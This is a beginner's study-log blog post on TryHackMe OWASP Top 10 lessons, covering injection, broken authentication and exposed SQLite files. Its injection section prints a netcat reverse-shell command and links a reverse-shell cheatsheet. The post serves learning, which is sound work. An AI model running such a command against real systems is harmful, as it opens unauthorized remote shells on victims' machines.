---
title: 'TryHackMe: Complete Beginner'
date: 2021-10-05 12:00:00.000000000 Z
layout: post-external
original_link: https://cardboard-iguana.com/log/2021-10-05-tryhackme-complete-beginner.html
author: 100007
---

# TryHackMe: Complete Beginner

**author:** Nathan Acks  
**date:** 2021-10-05

# OWASP Top 10

## (Severity 01) Injection

Some versions of netcat support a -e flag that hooks STDIN and STDOUT of an executable to the established network connection. So something like:

```
nc -e /bin/bash $LOCAL_IP $LOCAL_PORT
```

I’m pretty sure that this would have allowed us to avoid all of the named-pipe-magic that Metsploit generated a couple of days ago… Though I’m also pretty sure that Metasploit’s code is more robust (since it will work with versions of nc that _don’t_ support the -e flag).

[A library of reverse shell methods.](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

Injection attacks can be divided into two broad classes:

BLIND attacks are ones where command output is not returned to the attacker in a server response.

ACTIVE attacks are those where the command output _is_ returned to the attacker in a server response.

- [2021-10-02 - TryHackMe: Complete Beginner](https://cardboard-iguana.com/log/2021-10-02-tryhackme-complete-beginner.html)

## (Severity 02) Broken Authentication

Sometimes you don’t need to steal a session cookie… If the webserver isn’t setting session cookies in a sufficiently random fashion, _forging_ one can become an option!

The TryHackMe tutorial implies that a common mistake is to allow the registration of a username that matches an existing user but with a leading or trailing whitespace character; sometimes this new user will be interpreted to be the same as the old user (the one without the whitespace), resulting in the same level of access as that user.

Honestly, I’m trying to imagine how this would happen in most realistic contexts. Yes, it’s easy to construct an example in Bash (etc.), but most languages I’ve seen web apps written it take string quoting a lot more seriously.

## (Severity 03) Sensitive Data Exposure

So, the trick this section is talking about is that some small web applications use SQLite databases, and a sloppy webdev might store the database file in the application webroot where it can be downloaded and then read at our leisure.

